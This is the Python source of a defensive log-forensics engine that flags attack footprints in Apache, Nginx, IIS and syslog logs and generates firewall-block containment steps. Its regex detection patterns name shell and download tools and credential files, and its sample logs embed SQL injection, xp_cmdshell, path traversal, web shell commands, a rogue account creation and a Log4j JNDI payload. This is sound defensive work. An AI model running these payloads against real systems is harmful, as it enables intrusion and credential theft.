"""
SWA AI Digital Forensics & Incident Response (DFIR) Engine
Cross-Platform Attack Footprint & Server Log Analyzer (Windows, Linux, macOS)

Analyzes web and server access/error logs to identify attack footprints, indicators
of compromise (IoCs), attacker tactics (MITRE ATT&CK), malicious IPs, and timelines.
Supports:
- Nginx / Apache Combined & Common Log Format
- Microsoft IIS W3C Extended Log Format (Windows Server)
- Linux Syslog / Auth Logs (auth.log / secure)
- Generic Web Server & Cloud logs (Cloudflare, AWS CloudFront, FastAPI)
"""

import re
import urllib.parse
from datetime import datetime
from collections import Counter, defaultdict
from typing import Dict, List, Any, Optional

class ForensicsEngine:
    """
    Cross-platform forensic log analyzer for post-attack investigation
    and live threat detection.
    """

    # Signatures for known attack footprints
    ATTACK_SIGNATURES = [
        {
            "id": "DFIR-SQLI-001",
            "category": "SQL Injection",
            "mitre": "T1190 - Exploit Public-Facing Application",
            "severity": "CRITICAL",
            "regex": re.compile(
                r"(?i)(?:\bunion\b\s+(?:all\s+)?\bselect\b|'\s*or\s*['\d=]|--|/\*|\bwaitfor\s+delay\b|\bsleep\s*\(\d+\)|benchmark\s*\(\d+|information_schema|xp_cmdshell|pg_sleep|load_file\s*\()",
                re.IGNORECASE
            ),
            "description": "SQL injection syntax or blind time-delay payload detected."
        },
        {
            "id": "DFIR-SHELL-002",
            "category": "Web Shell & Backdoor",
            "mitre": "T1505.003 - Server Software Component: Web Shell",
            "severity": "CRITICAL",
            "regex": re.compile(
                r"(?i)(?:c99\.php|r57\.php|wso\.php|b374k|alfa\.php|shell\.php|cmd\.aspx|cmd\.jsp|eval\s*\(|base64_decode\s*\(|passthru\s*\(|shell_exec\s*\(|powershell(?:\.exe)?\s+(?:-[a-z]+|\/c)|cmd\.exe\s+\/c|\/bin\/(?:sh|bash)|whoami|net\s+user)",
                re.IGNORECASE
            ),
            "description": "Web shell artifact, backdoor script execution, or OS command payload."
        },
        {
            "id": "DFIR-TRAV-003",
            "category": "Path Traversal & LFI",
            "mitre": "T1083 - File and Directory Discovery",
            "severity": "HIGH",
            "regex": re.compile(
                r"(?i)(?:\.\./|\.\.\\|%2e%2e%2f|%2e%2e\/|\.\.%2f|%252e%252e%252f|etc/passwd|etc/shadow|proc/self/environ|windows/win\.ini|boot\.ini|php://filter|php://input|data://text)",
                re.IGNORECASE
            ),
            "description": "Directory traversal sequence or sensitive system file disclosure probe."
        },
        {
            "id": "DFIR-RCE-004",
            "category": "Command Injection / RCE",
            "mitre": "T1059 - Command and Scripting Interpreter",
            "severity": "CRITICAL",
            "regex": re.compile(
                r"(?i)(?:;\s*(?:cat|ls|id|whoami|curl|wget|nc|bash|sh|powershell)|\|\s*(?:id|whoami|cat)|`[^`]+`|\$\([^\)]+\)|nc\s+-e|certutil(?:\.exe)?\s+-urlcache|curl\s+-[sS]\s+http)",
                re.IGNORECASE
            ),
            "description": "OS command piping or arbitrary executable invocation sequence."
        },
        {
            "id": "DFIR-PROBE-005",
            "category": "Sensitive Configuration Probing",
            "mitre": "T1552 - Unsecured Credentials",
            "severity": "MEDIUM",
            "regex": re.compile(
                r"(?i)(?:\.env|\.git/(?:config|HEAD)|wp-config\.php|id_rsa|\.aws/credentials|web\.config|phpinfo\.php|server-status|\.htaccess|backup\.(?:sql|tar|zip|gz)|dump\.sql|config\.json\.bak)",
                re.IGNORECASE
            ),
            "description": "Probing for dotfiles, source version control (.git), database dumps, or API keys."
        },
        {
            "id": "DFIR-SCANNER-006",
            "category": "Automated Attack Scanner",
            "mitre": "T1595 - Active Scanning",
            "severity": "MEDIUM",
            "regex": re.compile(
                r"(?i)(?:nikto|sqlmap|gobuster|dirbuster|nuclei|masscan|hydra|acunetix|havij|wpscan|burpcollaborator|nmap\s+scripting\s+engine|zgrab|nessus|arachni)",
                re.IGNORECASE
            ),
            "description": "Reconnaissance or automated exploitation framework User-Agent."
        },
        {
            "id": "DFIR-SSRF-007",
            "category": "SSRF & Cloud Metadata Probe",
            "mitre": "T1090 - Proxy / External Proxy",
            "severity": "HIGH",
            "regex": re.compile(
                r"(?i)(?:169\.254\.169\.254|metadata\.google\.internal|127\.0\.0\.1|localhost:\d+|jndi:(?:ldap|rmi|dns)|aws/meta-data)",
                re.IGNORECASE
            ),
            "description": "Cloud instance metadata probing, internal network pivot, or Log4j JNDI attempt."
        },
        {
            "id": "DFIR-BRUTE-008",
            "category": "Auth Brute Force Footprint",
            "mitre": "T1110 - Brute Force",
            "severity": "MEDIUM",
            "regex": re.compile(
                r"(?i)(?:wp-login\.php|xmlrpc\.php|/admin/login|/api/v1/auth|/oauth/token|/administrator|user/login)",
                re.IGNORECASE
            ),
            "description": "Repeated authentication endpoint hits indicating potential brute-force or credential stuffing."
        }
    ]

    # Common Log Formats regex
    # 1. Combined/Common Apache & Nginx: IP - - [date] "METHOD URI PROTO" STATUS BYTES "REFERER" "USER-AGENT"
    REGEX_COMBINED = re.compile(
        r'^(?P<ip>\S+)\s+\S+\s+\S+\s+\[(?P<timestamp>[^\]]+)\]\s+"(?P<method>[A-Z]+)\s+(?P<uri>\S+)(?:\s+(?P<proto>HTTP\/[0-9\.]+))?"\s+(?P<status>\d{3})\s+(?P<bytes>\S+)(?:\s+"(?P<referer>[^"]*)"\s+"(?P<ua>[^"]*)")?'
    )

    # 2. Microsoft IIS W3C: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken
    REGEX_IIS = re.compile(
        r'^(?P<date>\d{4}-\d{2}-\d{2})\s+(?P<time>\d{2}:\d{2}:\d{2})\s+\S+\s+(?P<method>[A-Z]+)\s+(?P<stem>\S+)\s+(?P<query>\S+)\s+\S+\s+\S+\s+(?P<ip>\S+)\s+(?P<ua>\S+)\s+(?P<status>\d{3})'
    )

    # 3. Linux Syslog / Auth Log: Oct 23 10:14:22 host service[pid]: message
    REGEX_SYSLOG = re.compile(
        r'^(?P<timestamp>[A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+(?P<host>\S+)\s+(?P<service>[^:\[]+)(?:\[\d+\])?:\s+(?P<message>.*)$'
    )

    def __init__(self, raw_logs: str):
        self.raw_logs = raw_logs
        self.lines = [line.strip() for line in raw_logs.strip().splitlines() if line.strip()]

    def analyze(self) -> Dict[str, Any]:
        """Runs complete DFIR footprint discovery and returns structured incident analysis."""
        parsed_entries = []
        attack_footprints = []
        malicious_ips = Counter()
        category_counter = Counter()
        severity_counter = Counter()
        hourly_timeline = defaultdict(int)

        for line_num, line in enumerate(self.lines, start=1):
            if line.startswith("#"):
                continue  # Skip comments/headers

            parsed = self._parse_line(line)
            if not parsed:
                # Fallback simple line analyzer
                parsed = self._fallback_parse(line)

            parsed["line_number"] = line_num
            parsed_entries.append(parsed)

            # Analyze for attack footprints
            footprints = self._check_footprints(parsed, line)
            if footprints:
                for fp in footprints:
                    attack_footprints.append(fp)
                    ip = parsed.get("ip") or "Unknown"
                    malicious_ips[ip] += 1
                    category_counter[fp["category"]] += 1
                    severity_counter[fp["severity"]] += 1

                    ts_hour = self._extract_hour(parsed.get("timestamp", ""))
                    hourly_timeline[ts_hour] += 1

        # Post-process authentication brute-force clustering
        bf_traces = self._detect_brute_force_clustering(parsed_entries)
        for trace in bf_traces:
            attack_footprints.append(trace)
            category_counter[trace["category"]] += 1
            severity_counter[trace["severity"]] += 1
            malicious_ips[trace["ip"]] += trace.get("request_count", 1)

        # Determine overall Compromise Status
        compromise_status = self._evaluate_threat_level(attack_footprints, severity_counter)

        # Top attacker IPs with recommendations
        top_ips = []
        for ip, count in malicious_ips.most_common(10):
            top_ips.append({
                "ip": ip,
                "incident_count": count,
                "os_block_linux": f"iptables -A INPUT -s {ip} -j DROP # or ufw deny from {ip}",
                "os_block_windows": f'netsh advfirewall firewall add rule name="SWA-Block-{ip}" dir=in action=block remoteip={ip}',
                "os_block_macos": f'echo "block drop from {ip} to any" | sudo pfctl -a custom -f -',
                "cloudflare_waf": f'(ip.src eq {ip})'
            })

        return {
            "summary": {
                "total_lines_analyzed": len(self.lines),
                "total_attack_footprints": len(attack_footprints),
                "unique_threat_actors": len(malicious_ips),
                "threat_level": compromise_status["level"],
                "threat_headline": compromise_status["headline"],
                "threat_advice": compromise_status["advice"],
                "critical_incidents": severity_counter["CRITICAL"],
                "high_incidents": severity_counter["HIGH"],
                "medium_incidents": severity_counter["MEDIUM"],
                "low_incidents": severity_counter["LOW"],
            },
            "category_breakdown": dict(category_counter),
            "top_threat_actors": top_ips,
            "footprints": attack_footprints[:150],  # cap at 150 detailed events
            "incident_timeline": [
                {"hour": h, "incidents": cnt} for h, cnt in sorted(hourly_timeline.items())
            ],
            "containment_playbook": self._generate_containment_playbook(top_ips, category_counter)
        }

    def _parse_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parses combined, IIS, or syslog formats."""
        # 1. Combined/Apache/Nginx
        m = self.REGEX_COMBINED.match(line)
        if m:
            d = m.groupdict()
            return {
                "format": "Nginx/Apache Combined",
                "ip": d.get("ip"),
                "timestamp": d.get("timestamp"),
                "method": d.get("method"),
                "uri": d.get("uri"),
                "status": int(d.get("status", 0)),
                "ua": d.get("ua", ""),
                "referer": d.get("referer", "")
            }

        # 2. IIS W3C
        m = self.REGEX_IIS.match(line)
        if m:
            d = m.groupdict()
            uri = d.get("stem", "")
            query = d.get("query", "")
            if query and query != "-":
                uri = f"{uri}?{query}"
            return {
                "format": "Windows IIS W3C",
                "ip": d.get("ip"),
                "timestamp": f"{d.get('date')} {d.get('time')}",
                "method": d.get("method"),
                "uri": uri,
                "status": int(d.get("status", 0)),
                "ua": d.get("ua", "").replace("+", " "),
                "referer": ""
            }

        # 3. Syslog
        m = self.REGEX_SYSLOG.match(line)
        if m:
            d = m.groupdict()
            # Try to extract IP from message
            ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', d.get("message", ""))
            return {
                "format": "Linux Syslog",
                "ip": ip_match.group(0) if ip_match else d.get("host"),
                "timestamp": d.get("timestamp"),
                "method": "SYSLOG",
                "uri": d.get("service"),
                "status": 0,
                "ua": d.get("message"),
                "referer": ""
            }

        return None

    def _fallback_parse(self, line: str) -> Dict[str, Any]:
        """Simple heuristic extractor when log format doesn't match standard regex."""
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
        ip = ip_match.group(0) if ip_match else "0.0.0.0"

        method_match = re.search(r'\b(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\b', line)
        method = method_match.group(0) if method_match else "UNKNOWN"

        status_match = re.search(r'\s([1-5]\d{2})\s', line)
        status = int(status_match.group(1)) if status_match else 0

        # Try to find uri
        uri_match = re.search(r'(?:GET|POST|PUT|DELETE)\s+([^\s]+)', line)
        uri = uri_match.group(1) if uri_match else line

        return {
            "format": "Raw Log Heuristic",
            "ip": ip,
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "method": method,
            "uri": uri,
            "status": status,
            "ua": line,
            "referer": ""
        }

    def _check_footprints(self, entry: Dict[str, Any], raw_line: str) -> List[Dict[str, Any]]:
        """Matches log entry against threat patterns."""
        footprints = []
        uri = entry.get("uri") or ""
        ua = entry.get("ua") or ""
        decoded_uri = urllib.parse.unquote(uri)
        test_strings = f"{uri} {decoded_uri} {ua} {raw_line}"

        status = entry.get("status", 0)

        for sig in self.ATTACK_SIGNATURES:
            match = sig["regex"].search(test_strings)
            if match:
                matched_snippet = match.group(0)
                # Assess impact: If status is 200 on Web Shell or RCE, that's critical
                confirmed_execution = False
                if sig["category"] in ["Web Shell & Backdoor", "Command Injection / RCE", "SQL Injection"] and status in [200, 302, 500]:
                    confirmed_execution = True

                footprints.append({
                    "id": sig["id"],
                    "line": entry.get("line_number"),
                    "category": sig["category"],
                    "mitre": sig["mitre"],
                    "severity": "CRITICAL" if confirmed_execution else sig["severity"],
                    "ip": entry.get("ip", "Unknown"),
                    "timestamp": entry.get("timestamp", "N/A"),
                    "method": entry.get("method", "GET"),
                    "uri": entry.get("uri", ""),
                    "status": status,
                    "matched_token": matched_snippet[:60],
                    "description": sig["description"],
                    "potential_success": confirmed_execution,
                    "evidence_snippet": raw_line[:220]
                })

        return footprints

    def _detect_brute_force_clustering(self, entries: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Finds bursts of 401/403/404 on login paths from the same IP."""
        traces = []
        ip_auth_attempts = defaultdict(list)

        for e in entries:
            uri = (e.get("uri") or "").lower()
            method = e.get("method", "")
            status = e.get("status", 0)
            if any(login_term in uri for login_term in ["login", "signin", "admin", "xmlrpc.php", "auth"]) and (status in [401, 403, 404, 302] or method == "POST"):
                ip_auth_attempts[e.get("ip")].append(e)

        for ip, attempts in ip_auth_attempts.items():
            if len(attempts) >= 5:  # threshold: 5+ attempts
                first = attempts[0]
                last = attempts[-1]
                traces.append({
                    "id": "DFIR-CLUSTER-BRUTE",
                    "line": first.get("line_number", 0),
                    "category": "Credential Stuffing / Brute Force",
                    "mitre": "T1110 - Brute Force",
                    "severity": "HIGH",
                    "ip": ip,
                    "timestamp": f"{first.get('timestamp')} - {last.get('timestamp')}",
                    "method": "POST/MULTI",
                    "uri": first.get("uri", "/login"),
                    "status": 401,
                    "matched_token": f"{len(attempts)} failed authentication attempts in rapid succession",
                    "description": f"Automated authentication attack detected: {len(attempts)} login attempts from {ip}.",
                    "potential_success": any(a.get("status") == 200 for a in attempts),
                    "evidence_snippet": f"Targeted endpoint: {first.get('uri')} | Frequency: {len(attempts)} attempts | Final status: {last.get('status')}"
                })

        return traces

    def _extract_hour(self, timestamp: str) -> str:
        """Helper to group by hour for timeline."""
        # e.g., 23/Oct/2026:14:22:10 or 2026-10-23 14:22:10
        m = re.search(r'(\d{2}):\d{2}:\d{2}', timestamp)
        if m:
            return f"{m.group(1)}:00"
        return "Unknown"

    def _evaluate_threat_level(self, footprints: List[Dict[str, Any]], severity_counter: Counter) -> Dict[str, str]:
        """Calculates global DFIR severity posture."""
        has_critical_success = any(fp.get("potential_success") and fp["severity"] == "CRITICAL" for fp in footprints)

        if has_critical_success or severity_counter["CRITICAL"] >= 3:
            return {
                "level": "CRITICAL BREACH LIKELY",
                "headline": "Active Intrusion Footprints Detected with Server Response 200/500",
                "advice": "Immediate containment required. Web shell, RCE, or SQL injection payload execution was accepted by the application server. Isolate network, isolate database, review system process trees."
            }
        elif severity_counter["CRITICAL"] > 0 or severity_counter["HIGH"] >= 5:
            return {
                "level": "HIGH THREAT ATTEMPTS",
                "headline": "Targeted Exploitation Attempts Recorded in Server Logs",
                "advice": "Malicious actors actively attempting LFI, SQLi, or Command Injection. Implement firewall IP bans and verify WAF protection."
            }
        elif severity_counter["MEDIUM"] > 0:
            return {
                "level": "SUSPICIOUS ACTIVITY",
                "headline": "Automated Scanning & Probing Reconnaissance Footprints",
                "advice": "Recon tools (DirBuster, Nikto, sqlmap) or credential brute-force probes identified. Block scanning IPs and rotate exposed secrets."
            }
        else:
            return {
                "level": "CLEAN / BENIGN",
                "headline": "No Known Exploitation Footprints Identified in Provided Logs",
                "advice": "Log patterns appear consistent with standard benign traffic. Continue periodic audits and log archival."
            }

    def _generate_containment_playbook(self, top_ips: List[Dict[str, Any]], category_counter: Counter) -> List[Dict[str, str]]:
        """Produces cross-platform incident response containment steps."""
        steps = []

        if top_ips:
            ip_list = ", ".join([ip["ip"] for ip in top_ips[:3]])
            steps.append({
                "step": "1. Perimeter Containment (Block Hostile IPs)",
                "action": f"Block identified hostile IPs ({ip_list}) at the host and edge firewall immediately.",
                "linux_cmd": f"iptables -I INPUT 1 -s {top_ips[0]['ip']} -j DROP",
                "windows_cmd": f'netsh advfirewall firewall add rule name="DFIR-Emergency-Drop" dir=in action=block remoteip={top_ips[0]["ip"]}',
                "macos_cmd": f'sudo pfctl -t hostile_ips -T add {top_ips[0]["ip"]}'
            })

        if category_counter.get("Web Shell & Backdoor", 0) > 0:
            steps.append({
                "step": "2. Web Shell Search & Eradication",
                "action": "Scan document root for recently modified or created scripts (.php, .aspx, .jsp).",
                "linux_cmd": "find /var/www -type f -mtime -2 -name '*.php' -exec ls -la {} +",
                "windows_cmd": "Get-ChildItem -Path C:\\inetpub\\wwwroot -Recurse -Filter *.aspx | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-2)}",
                "macos_cmd": "find /Library/WebServer/Documents -type f -mtime -2"
            })

        if category_counter.get("SQL Injection", 0) > 0:
            steps.append({
                "step": "3. Database Audit & Evidence Preservation",
                "action": "Examine DB query audit logs for unauthorized schema dumping (information_schema) or privilege escalation.",
                "linux_cmd": "grep -iE '(union|select.*from.*users|into outfile)' /var/log/mysql/mysql.log",
                "windows_cmd": "Get-EventLog -LogName Application -Source *MSSQL* -Newest 100",
                "macos_cmd": "grep -i 'select' /usr/local/var/log/postgres*.log"
            })

        steps.append({
            "step": "4. Evidence Cryptographic Hashing",
            "action": "Calculate SHA-256 integrity checksums on all log files before tampering or rotation.",
            "linux_cmd": "sha256sum /var/log/nginx/access.log > /tmp/evidence_checksum.txt",
            "windows_cmd": "Get-FileHash -Algorithm SHA256 C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log",
            "macos_cmd": "shasum -a 256 /var/log/apache2/access_log > ~/evidence_hash.txt"
        })

        return steps

    # Realistic attack log samples for immediate testing
    SAMPLE_LOGS = {
        "apache_nginx": {
            "name": "Nginx/Apache Multi-Stage Breach Attempt",
            "description": "Reconnaissance with Nikto & DirBuster, SQL injection on /api/products, LFI /etc/passwd probe, and web shell execution.",
            "logs": """185.220.101.5 - - [23/Oct/2026:08:14:10 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
185.220.101.5 - - [23/Oct/2026:08:14:12 +0000] "GET /robots.txt HTTP/1.1" 200 120 "-" "Nikto/2.1.6"
185.220.101.5 - - [23/Oct/2026:08:14:15 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Nikto/2.1.6"
185.220.101.5 - - [23/Oct/2026:08:14:17 +0000] "GET /.git/config HTTP/1.1" 404 162 "-" "Nikto/2.1.6"
185.220.101.5 - - [23/Oct/2026:08:14:22 +0000] "GET /phpinfo.php HTTP/1.1" 404 162 "-" "DirBuster-1.0-RC1"
194.26.29.112 - - [23/Oct/2026:09:02:11 +0000] "GET /products.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 8920 "https://target.local/products.php" "Mozilla/5.0 (X11; Linux x86_64)"
194.26.29.112 - - [23/Oct/2026:09:02:45 +0000] "GET /products.php?id=1%20UNION%20SELECT%20null,table_name%20FROM%20information_schema.tables-- HTTP/1.1" 200 14200 "https://target.local/products.php" "sqlmap/1.6.4#stable"
194.26.29.112 - - [23/Oct/2026:09:03:10 +0000] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 2410 "-" "Mozilla/5.0"
194.26.29.112 - - [23/Oct/2026:09:05:02 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 48 "https://target.local/uploads/shell.php" "Mozilla/5.0"
194.26.29.112 - - [23/Oct/2026:09:05:14 +0000] "POST /uploads/shell.php?cmd=cat%20/etc/shadow HTTP/1.1" 500 180 "https://target.local/uploads/shell.php" "Mozilla/5.0"
93.184.216.34 - - [23/Oct/2026:09:10:00 +0000] "GET /about-us HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
93.184.216.34 - - [23/Oct/2026:09:10:05 +0000] "GET /contact HTTP/1.1" 200 3210 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
"""
        },
        "windows_iis": {
            "name": "Windows IIS W3C Server Intrusion",
            "description": "Microsoft IIS web server log showing web.config extraction, MSSQL blind time injection, and cmd.aspx backdoor invocation.",
            "logs": """2026-10-23 04:12:01 10.0.0.15 GET /index.html - 80 - 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 200 0 0 15
2026-10-23 04:12:15 10.0.0.15 GET /web.config - 80 - 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 404 0 2 20
2026-10-23 04:12:30 10.0.0.15 GET /search.aspx q=test';WAITFOR+DELAY+'0:0:5'-- 80 - 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 200 0 0 5032
2026-10-23 04:12:55 10.0.0.15 GET /search.aspx q=1';EXEC+xp_cmdshell('whoami')-- 80 - 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 200 0 0 120
2026-10-23 04:14:02 10.0.0.15 POST /uploads/cmd.aspx cmd=powershell+-enc+SQBFAFgA 80 - 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 200 0 0 250
2026-10-23 04:14:40 10.0.0.15 GET /cmd.aspx cmd=net+user+hacker+Password123!+/add 80 - 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 200 0 0 180
2026-10-23 04:15:10 10.0.0.15 GET /styles.css - 80 - 203.0.113.88 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+15_0) 200 0 0 10
"""
        },
        "wordpress_brute": {
            "name": "WordPress / CMS Auth Brute & SSRF Probe",
            "description": "Aggressive credential stuffing against wp-login.php, backup database dumping, and Log4j / Cloud metadata probes.",
            "logs": """45.33.32.156 - - [23/Oct/2026:11:00:01 +0000] "POST /wp-login.php HTTP/1.1" 401 1200 "https://target.local/wp-login.php" "Mozilla/5.0"
45.33.32.156 - - [23/Oct/2026:11:00:03 +0000] "POST /wp-login.php HTTP/1.1" 401 1200 "https://target.local/wp-login.php" "Mozilla/5.0"
45.33.32.156 - - [23/Oct/2026:11:00:05 +0000] "POST /wp-login.php HTTP/1.1" 401 1200 "https://target.local/wp-login.php" "Mozilla/5.0"
45.33.32.156 - - [23/Oct/2026:11:00:07 +0000] "POST /wp-login.php HTTP/1.1" 401 1200 "https://target.local/wp-login.php" "Mozilla/5.0"
45.33.32.156 - - [23/Oct/2026:11:00:09 +0000] "POST /wp-login.php HTTP/1.1" 401 1200 "https://target.local/wp-login.php" "Mozilla/5.0"
45.33.32.156 - - [23/Oct/2026:11:00:11 +0000] "POST /wp-login.php HTTP/1.1" 200 4500 "https://target.local/wp-login.php" "Mozilla/5.0"
103.251.167.20 - - [23/Oct/2026:11:02:30 +0000] "GET /wp-config.php.bak HTTP/1.1" 200 3540 "-" "curl/7.68.0"
103.251.167.20 - - [23/Oct/2026:11:02:45 +0000] "GET /backup.sql HTTP/1.1" 200 4892010 "-" "Wget/1.20.3"
103.251.167.20 - - [23/Oct/2026:11:05:00 +0000] "GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 820 "-" "Mozilla/5.0"
103.251.167.20 - - [23/Oct/2026:11:06:12 +0000] "GET /login HTTP/1.1" 400 120 "-" "${jndi:ldap://103.251.167.20:1389/Exploit}"
"""
        }
    }

